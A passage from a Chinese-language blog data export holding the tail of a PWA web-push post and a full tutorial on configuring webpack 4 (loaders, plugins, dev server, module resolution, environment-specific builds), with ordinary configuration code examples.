res.sendStatus(201)) .catch(err =&gt; &#123; console.log(err); &#125;);&#125;);app.listen(3111, function () &#123; console.log('Web push app listening on port 3111!')&#125;); service worker监听push事件，将通知详情推送给用户 123456789101112131415// service-worker.jsself.addEventListener('push', function (event) &#123; // 检查服务端是否发来了任何有效载荷数据 var payload = event.data ? JSON.parse(event.data.text()) : 'no payload'; var title = 'Progressive Times'; event.waitUntil( // 使用提供的信息来显示 Web 推送通知 self.registration.showNotification(title, &#123; body: payload.msg, url: payload.url, icon: payload.icon &#125;) );&#125;); 三、参考 网站渐进式增强体验(PWA)改造：Service Worker 应用详解 PWA实战：面向下一代的Progressive Web APP Service Worker最佳实践","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"PWA","slug":"PWA","permalink":"https://ru23.com/tags/PWA/"}]},{"title":"webpack4定制前端开发环境","slug":"2018-09-webpack-custom-work-flow","date":"2018-09-04T07:10:12.000Z","updated":"2018-10-24T03:46:03.258Z","comments":true,"path":"note/97542e7b.html","link":"","permalink":"https://ru23.com/note/97542e7b.html","excerpt":"","text":"来源掘金小册笔记 一、webpack概念和基础使用1.1 安装和使用1234567npm install webpack webpack-cli -g # 或者yarn global add webpack webpack-cli# 然后就可以全局执行命令了webpack --help 1.2 webpack 的基本概念 webpack 本质上是一个打包工具，它会根据代码的内容解析模块依赖，帮助我们把多个模块的代码打包 image.png webpack 会把我们项目中使用到的多个代码模块（可以是不同文件类型），打包构建成项目运行仅需要的几个静态文件 入口 入口可以使用 entry字段来进行配置，webpack 支持配置多个入口来进行构建 1234567891011121314151617181920212223242526272829module.exports = &#123; entry: './src/index.js' &#125;// 上述配置等同于module.exports = &#123; entry: &#123; main: './src/index.js' &#125;&#125;// 或者配置多个入口module.exports = &#123; entry: &#123; foo: './src/page-foo.js', bar: './src/page-bar.js', // ... &#125;&#125;// 使用数组来对多个文件进行打包module.exports = &#123; entry: &#123; main: [ './src/foo.js', './src/bar.js' ] &#125;&#125;... loader 可以把 loader理解为是一个转换器，负责把某种文件格式的内容转换成 webpack 可以支持打包的模块 当我们需要使用不同的 loader 来解析处理不同类型的文件时，我们可以在 module.rules 字段下来配置相关的规则，例如使用 Babel 来处理 .js 文件 123456789101112module: &#123; // ... rules: [ &#123; test: /\\.jsx?/, // 匹配文件路径的正则表达式，通常我们都是匹配文件类型后缀 include: [ path.resolve(__dirname, 'src') // 指定哪些路径下的文件需要经过 loader 处理 ], use: 'babel-loader', // 指定使用的 loader &#125;, ],&#125;... plugin 模块代码转换的工作由 loader 来处理，除此之外的其他任何工作都可以交由 plugin 来完成。通过添加我们需要的 plugin，可以满足更多构建中特殊的需求。例如，要使用压缩 JS代码的 uglifyjs-webpack-plugin 插件，只需在配置中通过 plugins字段添加新的 plugin即可… 1234567const UglifyPlugin = require('uglifyjs-webpack-plugin')module.exports = &#123; plugins: [ new UglifyPlugin() ],&#125; plugin 理论上可以干涉 webpack 整个构建流程，可以在流程的每一个步骤中定制自己的构建需求 输出 构建结果的文件名、路径等都是可以配置的，使用 output字段 12345678910111213141516171819202122232425262728module.exports = &#123; // ... output: &#123; path: path.resolve(__dirname, 'dist'), filename: 'bundle.js', &#125;,&#125;// 或者多个入口生成不同文件module.exports = &#123; entry: &#123; foo: './src/foo.js', bar: './src/bar.js', &#125;, output: &#123; filename: '[name].js', path: __dirname + '/dist', &#125;,&#125;// 路径中使用 hash，每次构建时会有一个不同 hash 值，避免发布新版本时线上使用浏览器缓存module.exports = &#123; // ... output: &#123; filename: '[name].js', path: __dirname + '/dist/[hash]', &#125;,&#125;... 我们一开始直接使用 webpack 构建时，默认创建的输出内容就是 ./dist/main.js 一个简单的 webpack 配置 我们把上述涉及的几部分配置内容合到一起，就可以创建一个简单的 webpack 配置了，webpack 运行时默认读取项目下的 webpack.config.js 文件作为配置。所以我们在项目中创建一个 webpack.config.js 文件 12345678910111213141516171819202122232425262728293031323334353637383940const path = require('path')const UglifyPlugin = require('uglifyjs-webpack-plugin')module.exports = &#123; entry: './src/index.js', output: &#123; path: path.resolve(__dirname, 'dist'), filename: 'bundle.js', &#125;, module: &#123; rules: [ &#123; test: /\\.jsx?/, include: [ path.resolve(__dirname, 'src') ], use: 'babel-loader', &#125;, ], &#125;, // 代码模块路径解析的配置 resolve: &#123; modules: [ \"node_modules\", path.resolve(__dirname, 'src') ], extensions: [\".wasm\", \".mjs\", \".js\", \".json\", \".jsx\"], &#125;, plugins: [ new UglifyPlugin(), // 使用 uglifyjs-webpack-plugin 来压缩 JS 代码 // 如果你留意了我们一开始直接使用 webpack 构建的结果，你会发现默认已经使用了 JS 代码压缩的插件 // 这其实也是我们命令中的 --mode production 的效果，后续的小节会介绍 webpack 的 mode 参数 ],&#125;... 二、搭建基础的前端开发环境2.1 关联 HTML webpack 默认从作为入口的 .js 文件进行构建（更多是基于 SPA 去考虑），但通常一个前端项目都是从一个页面（即 HTML）出发的，最简单的方法是，创建一个 HTML 文件，使用 script 标签直接引用构建好的 JS 文件，如… 1&lt;script src=&quot;./dist/bundle.js&quot;&gt;&lt;/script&gt; 但是，如果我们的文件名或者路径会变化，例如使用 [hash] 来进行命名，那么最好是将 HTML 引用路径和我们的构建结果关联起来，这个时候我们可以使用 html-webpack-plugin html-webpack-plugin 是一个独立的 node package，所以在使用之前我们需要先安装它，把它安装到项目的开发依赖中 1npm install html-webpack-plugin -D 然后在 webpack配置中，将 html-webpack-plugin 添加到 plugins 列表中 12345678const HtmlWebpackPlugin = require('html-webpack-plugin')module.exports = &#123; // ... plugins: [ new HtmlWebpackPlugin(), ],&#125;... 这样配置好之后，构建时 html-webpack-plugin 会为我们创建一个 HTML 文件，其中会引用构建出来的 JS 文件。实际项目中，默认创建的 HTML 文件并没有什么用，我们需要自己来写 HTML 文件，可以通过 html-webpack-plugin 的配置，传递一个写好的 HTML 模板… 123456789module.exports = &#123; // ... plugins: [ new HtmlWebpackPlugin(&#123; filename: 'index.html', // 配置输出文件名和路径 template: 'assets/index.html', // 配置文件模板 &#125;), ],&#125;... 这样，通过 html-webpack-plugin 就可以将我们的页面和构建 JS 关联起来，回归日常，从页面开始开发。如果需要添加多个页面关联，那么实例化多个 html-webpack-plugin， 并将它们都放到 plugins 字段数组中就可以了… 2.2 构建 CSS 我们编写 CSS，并且希望使用 webpack 来进行构建，为此，需要在配置中引入 loader 来解析和处理 CSS 文件 1234567891011121314151617module.exports = &#123; module: &#123; rules: [ // ... &#123; test: /\\.css/, include: [ path.resolve(__dirname, 'src'), ], use: [ 'style-loader', 'css-loader', ], &#125;, ], &#125;&#125;... css-loader 负责解析 CSS 代码，主要是为了处理 CSS 中的依赖，例如 @import 和 url() 等引用外部文件的声明； style-loader 会将 css-loader 解析的结果转变成 JS代码，运行时动态插入 style 标签来让 CSS 代码生效… 经由上述两个 loader 的处理后，CSS 代码会转变为 JS，和 index.js一起打包了。如果需要单独把 CSS 文件分离出来，我们需要使用 extract-text-webpack-plugin 插件 123456789101112131415161718192021const ExtractTextPlugin = require('extract-text-webpack-plugin')module.exports = &#123; // ... module: &#123; rules: [ &#123; test: /\\.css$/, // 因为这个插件需要干涉模块转换的内容，所以需要使用它对应的 loader use: ExtractTextPlugin.extract(&#123; fallback: 'style-loader', use: 'css-loader', &#125;), &#125;, ], &#125;, plugins: [ // 引入插件，配置文件名，这里同样可以使用 [hash] new ExtractTextPlugin('index.css'), ],&#125;... 2.3 CSS 预处理器 在上述使用 CSS 的基础上，通常我们会使用 Less/Sass 等 CSS 预处理器，webpack 可以通过添加对应的 loader 来支持，以使用 Less 为例，我们可以在官方文档中找到对应的 loader 12345678910111213141516171819module.exports = &#123; // ... module: &#123; rules: [ &#123; test: /\\.less$/, // 因为这个插件需要干涉模块转换的内容，所以需要使用它对应的 loader use: ExtractTextPlugin.extract(&#123; fallback: 'style-loader', use: [ 'css-loader', 'less-loader', ], &#125;), &#125;, ], &#125;, // ...&#125;... 2.4 处理图片文件 在前端项目的样式中总会使用到图片，虽然我们已经提到 css-loader 会解析样式中用 url() 引用的文件路径，但是图片对应的 jpg/png/gif 等文件格式，webpack 处理不了。是的，我们只要添加一个处理图片的 loader 配置就可以了，现有的 file-loader 就是个不错的选择… file-loader 可以用于处理很多类型的文件，它的主要作用是直接输出文件，把构建后的文件路径返回。配置很简单，在 rules中添加一个字段，增加图片类型文件的解析配置 12345678910111213141516module.exports = &#123; // ... module: &#123; rules: [ &#123; test: /\\.(png|jpg|gif)$/, use: [ &#123; loader: 'file-loader', options: &#123;&#125;, &#125;, ], &#125;, ], &#125;,&#125;... 2.5 使用 Babel Babel 是一个让我们能够使用 ES 新特性的 JS 编译工具，我们可以在 webpack 中配置 Babel，以便使用 ES6、ES7 标准来编写 JS代码 1234567891011121314module.exports = &#123; // ... module: &#123; rules: [ &#123; test: /\\.jsx?/, // 支持 js 和 jsx include: [ path.resolve(__dirname, 'src'), // src 目录下的才需要经过 babel-loader 处理 ], loader: 'babel-loader', &#125;, ], &#125;,&#125;... 2.6 启动静态服务 至此，我们完成了处理多种文件类型的 webpack 配置。我们可以使用 webpack-dev-server 在本地开启一个简单的静态服务来进行开发 1234\"scripts\": &#123; \"build\": \"webpack --mode production\", \"start\": \"webpack-dev-server --mode development\"&#125; 尝试着运行 npm start 或者 yarn start，然后就可以访问http://localhost:8080/ 来查看你的页面了。默认是访问 index.html，如果是其他页面要注意访问的 URL 是否正确 2.7 完整示例代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061const path = require('path')const HtmlWebpackPlugin = require('html-webpack-plugin')const ExtractTextPlugin = require('extract-text-webpack-plugin')module.exports = &#123; entry: './src/index.js', output: &#123; path: path.resolve(__dirname, 'dist'), filename: '[name].js', &#125;, module: &#123; rules: [ &#123; test: /\\.jsx?/, include: [ path.resolve(__dirname, 'src'), ], use: 'babel-loader', &#125;, &#123; test: /\\.less$/, // 因为这个插件需要干涉模块转换的内容，所以需要使用它对应的 loader use: ExtractTextPlugin.extract(&#123; fallback: 'style-loader', use: [ 'css-loader', 'less-loader', ], &#125;), &#125;, &#123; test: /\\.(png|jpg|gif)$/, use: [ &#123; loader: 'file-loader' &#125;, ], &#125;, ], &#125;, // 代码模块路径解析的配置 resolve: &#123; modules: [ \"node_modules\", path.resolve(__dirname, 'src'), ], extensions: [\".wasm\", \".mjs\", \".js\", \".json\", \".jsx\"], &#125;, plugins: [ new HtmlWebpackPlugin(&#123; filename: 'index.html', // 配置输出文件名和路径 template: 'src/index.html', // 配置文件模板 &#125;), new ExtractTextPlugin('[name].css'), ],&#125; 三、webpack如何解析代码模块路径 webpack 中有一个很关键的模块 enhanced-resolve 就是处理依赖模块路径的解析的，这个模块可以说是 Node.js 那一套模块路径解析的增强版本，有很多可以自定义的解析配置 在 webpack 配置中，和模块路径解析相关的配置都在 resolve字段下 12345module.exports = &#123; resolve: &#123; // ... &#125;&#125; 3.1 常用的一些配置resolve.alias 假设我们有个 utils 模块极其常用，经常编写相对路径很麻烦，希望可以直接 import &#39;utils&#39; 来引用，那么我们可以配置某个模块的别名，如 123alias: &#123; utils: path.resolve(__dirname, 'src/utils') // 这里使用 path.resolve 和 __dirname 来获取绝对路径&#125; 上述的配置是模糊匹配，意味着只要模块路径中携带了 utils 就可以被替换掉，如： 1import &apos;utils/query.js&apos; // 等同于 import &apos;[项目绝对路径]/src/utils/query.js&apos; 如果需要进行精确匹配可以使用： 123alias: &#123; utils$: path.resolve(__dirname, 'src/utils') // 只会匹配 import 'utils'&#125; resolve.extensions 12extensions: ['.wasm', '.mjs', '.js', '.json', '.jsx'],// 这里的顺序代表匹配后缀的优先级，例如对于 index.js 和 index.jsx，会优先选择 index.js 这个配置的作用是和文件后缀名有关的,这个配置可以定义在进行模块路径解析时，webpack 会尝试帮你补全那些后缀名来进行查找 四、配置loader4.1 loader 匹配规则 当我们需要配置 loader 时，都是在 module.rules 中添加新的配置项，在该字段中，每一项被视为一条匹配使用 loader的规则 123456789101112131415module.exports = &#123; // ... module: &#123; rules: [ &#123; test: /\\.jsx?/, // 条件 include: [ path.resolve(__dirname, 'src'), ], // 条件 use: 'babel-loader', // 规则应用结果\u000e &#125;, // 一个 object 即一条规则 // ... ], &#125;,&#125;... loader 的匹配规则中有两个最关键的因素：一个是匹配条件，一个是匹配规则后的应用 4.2 规则条件配置 大多数情况下，配置 loader 的匹配条件时，只要使用 test 字段就好了，很多时候都只需要匹配文件后缀名来决定使用什么 loader，但也不排除在某些特殊场景下，我们需要配置比较复杂的匹配条件。webpack 的规则提供了多种配置形式… { test: ... } 匹配特定条件 { include: ... } 匹配特定路径 { exclude: ... }排除特定路径 { and: [...] }必须匹配数组中所有条件 { or: [...] }匹配数组中任意一个条件 { not: [...] } 排除匹配数组中所有条件… 上述的所谓条件的值可以是： 字符串：必须以提供的字符串开始，所以是字符串的话，这里我们需要提供绝对路径 正则表达式：调用正则的 test 方法来判断匹配 函数：(path) =&gt; boolean，返回 true 表示匹配 数组：至少包含一个条件的数组 对象：匹配所有属性值的条件… 123456789101112131415161718rules: [ &#123; test: /\\.jsx?/, // 正则 include: [ path.resolve(__dirname, 'src'), // 字符串，注意是绝对路径 ], // 数组 // ... &#125;, &#123; test: &#123; js: /\\.js/, jsx: /\\.jsx/, &#125;, // 对象，不建议使用 not: [ (value) =&gt; &#123; /* ... */ return true; &#125;, // 函数，通常需要高度自定义时才会使用 ], &#125;,],... 4.3 使用 loader 配置 module.rules 的匹配规则最重要的还是用于配置 loader，我们可以使用 use 字段 1234567891011121314151617181920rules: [ &#123; test: /\\.less/, use: [ 'style-loader', // 直接使用字符串表示 loader &#123; loader: 'css-loader', options: &#123; importLoaders: 1 &#125;, &#125;, // 用对象表示 loader，可以传递 loader 配置等 &#123; loader: 'less-loader', options: &#123; noIeCompat: true &#125;, // 传递 loader 配置 &#125;, ], &#125;,],... use字段可以是一个数组，也可以是一个字符串或者表示 loader 的对象。如果只需要一个 loader，也可以这样：use: { loader: &#39;babel-loader&#39;, options: { ... } } 4.4 loader 应用顺序 对于上面的 less 规则配置，一个 style.less 文件会途径 less-loader、css-loader、style-loader 处理，成为一个可以打包的模块。 loader 的应用顺序在配置多个 loader 一起工作时很重要，通常会使用在 CSS 配置上，除了 style-loader 和 css-loader，你可能还要配置 less-loader然后再加个 postcss 的 autoprefixer 等。 上述从后到前的顺序是在同一个 rule 中进行的，那如果多个 rule 匹配了同一个模块文件，loader 的应用顺序又是怎样的呢？看一份这样的配置… 123456789101112rules: [ &#123; test: /\\.js$/, exclude: /node_modules/, loader: \"eslint-loader\", &#125;, &#123; test: /\\.js$/, exclude: /node_modules/, loader: \"babel-loader\", &#125;,],... 这样无法法保证 eslint-loader 在 babel-loader 应用前执行。webpack在 rules 中提供了一个 enforce 的字段来配置当前 rule 的 loader 类型，没配置的话是普通类型，我们可以配置 pre或post，分别对应前置类型或后置类型的 loader… 所有的 loader 按照前置 -&gt; 行内 -&gt; 普通 -&gt; 后置的顺序执行。所以当我们要确保 eslint-loader 在 babel-loader 之前执行时，可以如下添加 enforce 配置 12345678rules: [ &#123; enforce: 'pre', // 指定为前置类型 test: /\\.js$/, exclude: /node_modules/, loader: \"eslint-loader\", &#125;,]... 当项目文件类型和应用的 loader 不是特别复杂的时候，通常建议把要应用的同一类型 loader 都写在同一个匹配规则中，这样更好维护和控制 4.5 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899const path = require('path')const webpack = require('webpack')const HtmlWebpackPlugin = require('html-webpack-plugin')const ExtractTextPlugin = require('extract-text-webpack-plugin')const CopyWebpackPlugin = require('copy-webpack-plugin')module.exports = &#123; entry: './src/index', output: &#123; path: path.resolve(__dirname, 'dist'), filename: '[name].js', &#125;, module: &#123; rules: [ &#123; enforce: 'pre', // 指定为前置类型 test: /\\.jsx?$/, exclude: /node_modules/, loader: \"eslint-loader\", &#125;, &#123; test: /\\.jsx?$/, include: [ path.resolve(__dirname, 'src'), ], use: 'babel-loader', &#125;, &#123; test: /\\.css$/, use: ExtractTextPlugin.extract(&#123; fallback: 'style-loader', use: [ 'css-loader', ], &#125;), &#125;, &#123; test: /\\.less$/, use: ExtractTextPlugin.extract(&#123; fallback: 'style-loader', use: [ 'css-loader', 'less-loader', ], &#125;), &#125;, &#123; test: /\\.(png|jpg|gif)$/, use: [ &#123; loader: 'file-loader' &#125;, ], &#125;, ], &#125;, resolve: &#123; alias: &#123; utils: path.resolve(__dirname, 'src/utils'), // 这里使用 path.resolve 和 __dirname 来获取绝对路径 log$: path.resolve(__dirname, 'src/utils/log.js') // 只匹配 log &#125;, extensions: ['.js', '.json', '.jsx', '.css', '.less'], modules: [ path.resolve(__dirname, 'node_modules'), // 指定当前目录下的 node_modules 优先查找 ], &#125;, plugins: [ new HtmlWebpackPlugin(&#123; filename: 'index.html', // 配置输出文件名和路径 template: 'src/index.html', // 配置文件模板 &#125;), new ExtractTextPlugin('[name].css'), new webpack.DefinePlugin(&#123; TWO: '1+1', CONSTANTS: &#123; APP_VERSION: JSON.stringify('1.1.2'), // const CONSTANTS = &#123; APP_VERSION: '1.1.2' &#125; &#125;, &#125;), new CopyWebpackPlugin([ &#123; from: 'src/assets/favicon.ico', to: 'favicon.ico', &#125;, // 顾名思义，from 配置来源，to 配置目标路径 ]), new webpack.ProvidePlugin(&#123; _: 'lodash', &#125;), ], devServer: &#123; port: '1234', before(app)&#123; app.get('/api/test.json', function(req, res) &#123; // 当访问 /some/path 路径时，返回自定义的 json 数据 res.json(&#123; code: 200, message: 'hello world' &#125;) &#125;) &#125; &#125;,&#125; 五、使用plugin 更多的插件可以在这里查找：plugins in awesome-webpack 5.1 DefinePlugin DefinePlugin 是 webpack 内置的插件，可以使用 webpack.DefinePlugin 直接获取 这个插件用于创建一些在编译时可以配置的全局常量，这些常量的值我们可以在 webpack 的配置中去指定，例如 1234567891011121314module.exports = &#123; // ... plugins: [ new webpack.DefinePlugin(&#123; PRODUCTION: JSON.stringify(true), // const PRODUCTION = true VERSION: JSON.stringify('5fa3b9'), // const VERSION = '5fa3b9' BROWSER_SUPPORTS_HTML5: true, // const BROWSER_SUPPORTS_HTML5 = 'true' TWO: '1+1', // const TWO = 1 + 1, CONSTANTS: &#123; APP_VERSION: JSON.stringify('1.1.2') // const CONSTANTS = &#123; APP_VERSION: '1.1.2' &#125; &#125; &#125;), ],&#125;... 有了上面的配置，就可以在应用代码文件中，访问配置好的变量了，如： 123console.log(\"Running App version \" + VERSION);if(!BROWSER_SUPPORTS_HTML5) require(\"html5shiv\"); 上面配置的注释已经简单说明了这些配置的效果，这里再简述一下整个配置规则。 如果配置的值是字符串，那么整个字符串会被当成代码片段来执行，其结果作为最终变量的值，如上面的 &quot;1+1&quot;，最后的结果是 2 如果配置的值不是字符串，也不是一个对象字面量，那么该值会被转为一个字符串，如 true，最后的结果是 &#39;true&#39; 如果配置的是一个对象字面量，那么该对象的所有 key会以同样的方式去定义 这样我们就可以理解为什么要使用 JSON.stringify() 了，因为 JSON.stringify(true) 的结果是 &#39;true&#39;，JSON.stringify(&quot;5fa3b9&quot;) 的结果是 &quot;5fa3b9&quot;。 社区中关于 DefinePlugin 使用得最多的方式是定义环境变量，例如 PRODUCTION = true 或者 __DEV__ = true 等。部分类库在开发环境时依赖这样的环境变量来给予开发者更多的开发调试反馈，例如 react 等。 建议使用 process.env.NODE_ENV: … 的方式来定义 process.env.NODE_ENV，而不是使用 process: { env: { NODE_ENV: ... } } 的方式，因为这样会覆盖掉 process 这个对象，可能会对其他代码造成影响… 5.2 copy-webpack-plugin 我们一般会把开发的所有源码和资源文件放在 src/ 目录下，构建的时候产出一个 build/ 目录，通常会直接拿 build 中的所有文件来发布。有些文件没经过 webpack 处理，但是我们希望它们也能出现在 build 目录下，这时就可以使用 CopyWebpackPlugin 来处理了… 123456789101112const CopyWebpackPlugin = require('copy-webpack-plugin')module.exports = &#123; // ... plugins: [ new CopyWebpackPlugin([ &#123; from: 'src/file.txt', to: 'build/file.txt', &#125;, // 顾名思义，from 配置来源，to 配置目标路径 &#123; from: 'src/*.ico', to: 'build/*.ico' &#125;, // 配置项可以使用 glob // 可以配置很多项复制规则 ]), ],&#125;... 5.3 extract-text-webpack-plugin 我们用它来把依赖的 CSS 分离出来成为单独的文件。这里再看一下使用 extract-text-webpack-plugin 的配置 123456789101112131415161718192021const ExtractTextPlugin = require('extract-text-webpack-plugin')module.exports = &#123; // ... module: &#123; rules: [ &#123; test: /\\.css$/, // 因为这个插件需要干涉模块转换的内容，所以需要使用它对应的 loader use: ExtractTextPlugin.extract(&#123; fallback: 'style-loader', use: 'css-loader', &#125;), &#125;, ], &#125;, plugins: [ // 引入插件，配置文件名，这里同样可以使用 [hash] new ExtractTextPlugin('index.css'), ],&#125;... 在上述的配置中，我们使用了 index.css 作为单独分离出来的文件名，但有的时候构建入口不止一个，extract-text-webpack-plugin 会为每一个入口创建单独分离的文件，因此最好这样配置 1234// 这样确保在使用多个构建入口时，生成不同名称的文件plugins: [ new ExtractTextPlugin('[name].css'),], 六、更好使用webpack-dev-server webpack-dev-server 是 webpack 官方提供的一个工具，可以基于当前的 webpack 构建配置快速启动一个静态服务。当 mode 为 development 时，会具备 hot reload 的功能，即当源码文件变化时，会即时更新当前页面，以便你看到最新的效果… 6.1 基础使用 webpack-dev-server 是一个 npm package，安装后在已经有 webpack 配置文件的项目目录下直接启动就可以 webpack-dev-server 默认使用 8080 端口 12npm install webpack-dev-server -gwebpack-dev-server --mode development package 中的 scripts 配置： 123456&#123; // ... \"scripts\": &#123; \"start\": \"webpack-dev-server --mode development\" &#125;&#125; 6.2 配置 在 webpack 的配置中，可以通过 devServer 字段来配置 webpack-dev-server，如端口设置、启动 gzip 压缩等，这里简单讲解几个常用的配置 public字段用于指定静态服务的域名，默认是 http://localhost:8080/ ，当你使用 Nginx 来做反向代理时，应该就需要使用该配置来指定 Nginx 配置使用的服务域名 port 字段用于指定静态服务的端口，如上，默认是 8080，通常情况下都不需要改动 publicPath 字段用于指定构建好的静态文件在浏览器中用什么路径去访问，默认是 /，例如，对于一个构建好的文件 bundle.js，完整的访问路径是 http://localhost:8080/bundle.js，如果你配置了 publicPath: &#39;assets/&#39;，那么上述 bundle.js 的完整访问路径就是 http://localhost:8080/assets/bundle.js。可以使用整个 URL 来作为 publicPath的值，如 publicPath: &#39;http://localhost:8080/assets/&#39;。如果你使用了 HMR，那么要设置 publicPath 就必须使用完整的 URL 建议将 devServer.publicPath 和 output.publicPath 的值保持一致 proxy用于配置 webpack-dev-server将特定 URL 的请求代理到另外一台服务器上。当你有单独的后端开发服务器用于请求 API 时，这个配置相当有用。例如 123456proxy: &#123; '/api': &#123; target: \"http://localhost:3000\", // 将 URL 中带有 /api 的请求代理到本地的 3000 端口的服务上 pathRewrite: &#123; '^/api': '' &#125;, // 把 URL 中 path 部分的 `api` 移除掉 &#125;,&#125;... before 和 after 配置用于在 webpack-dev-server 定义额外的中间件，如 12345before(app)&#123; app.get('/some/path', function(req, res) &#123; // 当访问 /some/path 路径时，返回自定义的 json 数据 res.json(&#123; custom: 'response' &#125;) &#125;)&#125;... before 在 webpack-dev-server 静态资源中间件处理之前，可以用于拦截部分请求返回特定内容，或者实现简单的数据 mock。 after 在 webpack-dev-server 静态资源中间件处理之后，比较少用到，可以用于打印日志或者做一些额外处理… 七、开发和生产环境的构建配置差异 我们在日常的前端开发工作中，一般都会有两套构建环境：一套开发时使用，构建结果用于本地开发调试，不进行代码压缩，打印 debug 信息，包含sourcemap 文件 另外一套构建后的结果是直接应用于线上的，即代码都是压缩后，运行时不打印 debug 信息，静态文件不包括 sourcemap 的。有的时候可能还需要多一套测试环境，在运行时直接进行请求 mock 等工作 webpack 4.x 版本引入了 mode 的概念，在运行 webpack 时需要指定使用 production或 development 两个 mode 其中一个，这个功能也就是我们所需要的运行两套构建环境的能力。 7.1 在配置文件中区分 mode 之前我们的配置文件都是直接对外暴露一个 JS 对象，这种方式暂时没有办法获取到 webpack 的 mode 参数，我们需要更换一种方式来处理配置。根据官方的文档多种配置类型，配置文件可以对外暴露一个函数，因此我们可以这样做 123456789101112module.exports = (env, argv) =&gt; (&#123; // ... 其他配置 optimization: &#123; minimize: false, // 使用 argv 来获取 mode 参数的值 minimizer: argv.mode === 'production' ? [ new UglifyJsPlugin(&#123; /* 你自己的配置 */ &#125;), // 仅在我们要自定义压缩配置时才需要这么做 // mode 为 production 时 webpack 会默认使用压缩 JS 的 plugin ] : [], &#125;,&#125;)... 这样获取 mode 之后，我们就能够区分不同的构建环境，然后根据不同环境再对特殊的 loader或plugin 做额外的配置就可以了 以上是 webpack 4.x 的做法，由于有了 mode 参数，区分环境变得简单了。不过在当前业界，估计还是使用 webpack 3.x 版本的居多，所以这里也简单介绍一下 3.x 如何区分环境 webpack 的运行时环境是Node.js，我们可以通过 Node.js提供的机制给要运行的 webpack 程序传递环境变量，来控制不同环境下的构建行为。例如，我们在 npm 中的 scripts 字段添加一个用于生产环境的构建命令… 123456&#123; \"scripts\": &#123; \"build\": \"NODE_ENV=production webpack\", \"develop\": \"NODE_ENV=development webpack-dev-server\" &#125;&#125;... 然后在 webpack.config.js 文件中可以通过 process.env.NODE_ENV 来获取命令传入的环境变量 12345678910const config = &#123; // ... webpack 配置&#125;if (process.env.NODE_ENV === 'production') &#123; // 生产环境需要做的事情，如使用代码压缩插件等 config.plugins.push(new UglifyJsPlugin())&#125;module.exports = config... 7.2 运行时的环境变量 我们使用 webpack 时传递的 mode 参数，是可以在我们的应用代码运行时，通过 process.env.NODE_ENV 这个变量获取的。这样方便我们在运行时判断当前执行的构建环境，使用最多的场景莫过于控制是否打印 debug 信息… 下面这个简单的例子，在应用开发的代码中实现一个简单的 console打印封装 12345export default function log(...args) &#123; if (process.env.NODE_ENV === 'development' &amp;&amp; console &amp;&amp; console.log) &#123; console.log.apply(console, args) &#125;&#125;... 同样，以上是 webpack 4.x 的做法，下面简单介绍一下 3.x 版本应该如何实现。这里需要用到 DefinePlugin 插件，它可以帮助我们在构建时给运行时定义变量，那么我们只要在前面 webpack 3.x 版本区分构建环境的例子的基础上，再使用 DefinePlugin 添加环境变量即可影响到运行时的代码… 1234567891011module.exports = &#123; // ... // webpack 的配置 plugins: [ new webpack.DefinePlugin(&#123; // webpack 3.x 的 process.env.NODE_ENV 是通过手动在命令行中指定 NODE_ENV=... 的方式来传递的 'process.env.NODE_ENV': JSON.stringify(process.env.NODE_ENV), &#125;), ],&#125;... 7.3 常见的环境差异配置常见的 webpack 构建差异配置 生产环境可能需要分离 CSS成单独的文件，以便多个页面共享同一个 CSS 文件 生产环境需要压缩 HTML/CSS/JS 代码 生产环境需要压缩图片 开发环境需要生成 sourcemap 文件 开发环境需要打印 debug 信息 开发环境需要 live reload或者 hot reload 的功能… webpack 4.x 的 mode 已经提供了上述差异配置的大部分功能，mode 为 production 时默认使用 JS 代码压缩，而mode 为 development 时默认启用 hot reload，等等。这样让我们的配置更为简洁，我们只需要针对特别使用的 loader 和 plugin 做区分配置就可以了… webpack 3.x 版本还是只能自己动手修改配置来满足大部分环境差异需求，所以如果你要开始一个新的项目，建议直接使用 webpack 4.x版本 7.4 拆分配置 前面我们列出了几个环境差异配置，可能这些构建需求就已经有点多了，会让整个 webpack 的配置变得复杂，尤其是有着大量环境变量判断的配置。我们可以把 webpack 的配置按照不同的环境拆分成多个文件，运行时直接根据环境变量加载对应的配置即可。基本的划分如下… webpack.base.js：基础部分，即多个文件中共享的配置 webpack.development.js：开发环境使用的配置 webpack.production.js：生产环境使用的配置 webpack.test.js：测试环境使用的配置… 如何处理这样的配置拆分 首先我们要明白，对于 webpack 的配置，其实是对外暴露一个 JS 对象，所以对于这个对象，我们都可以用 JS 代码来修改它，例如 12345678const config = &#123; // ... webpack 配置&#125;// 我们可以修改这个 config 来调整配置，例如添加一个新的插件config.plugins.push(new YourPlugin());module.exports = config;... 因此，只要有一个工具能比较智能地合并多个配置对象，我们就可以很轻松地拆分 webpack 配置，然后通过判断环境变量，使用工具将对应环境的多个配置对象整合后提供给 webpack 使用。这个工具就是 webpack-merge 我们的 webpack 配置基础部分，即 webpack.base.js 应该大致是这样的 12345678910111213141516171819202122module.exports = &#123; entry: '...', output: &#123; // ... &#125;, resolve: &#123; // ... &#125;, module: &#123; // 这里是一个简单的例子，后面介绍 API 时会用到 rules: [ &#123; test: /\\.js$/, use: ['babel'], &#125;, ], // ... &#125;, plugins: [ // ... ],&#125;... 然后 webpack.development.js 需要添加 loader 或 plugin，就可以使用 webpack-merge的 API，例如 123456789101112131415161718192021222324const &#123; smart &#125; = require('webpack-merge')const webpack = require('webpack')const base = require('./webpack.base.js')module.exports = smart(base, &#123; module: &#123; rules: [ // 用 smart API，当这里的匹配规则相同且 use 值都是数组时，smart 会识别后处理 // 和上述 base 配置合并后，这里会是 &#123; test: /\\.js$/, use: ['babel', 'coffee'] &#125; // 如果这里 use 的值用的是字符串或者对象的话，那么会替换掉原本的规则 use 的值 &#123; test: /\\.js$/, use: ['coffee'], &#125;, // ... ], &#125;, plugins: [ // plugins 这里的数组会和 base 中的 plugins 数组进行合并 new webpack.DefinePlugin(&#123; 'process.env.NODE_ENV': JSON.stringify(process.env.NODE_ENV), &#125;), ],&#125;)... 可见 webpack-merge 提供的 smart 方法，可以帮助我们更加轻松地处理 loader 配置的合并。webpack-merge 还有其他 API 可以用于自定义合并行为 https://github.com/survivejs/webpack-merge 7.5 完整代码 webpack.config.js 12345module.exports = function(env, argv) &#123; return argv.mode === 'production' ? require('./configs/webpack.production') : require('./configs/webpack.development')&#125; 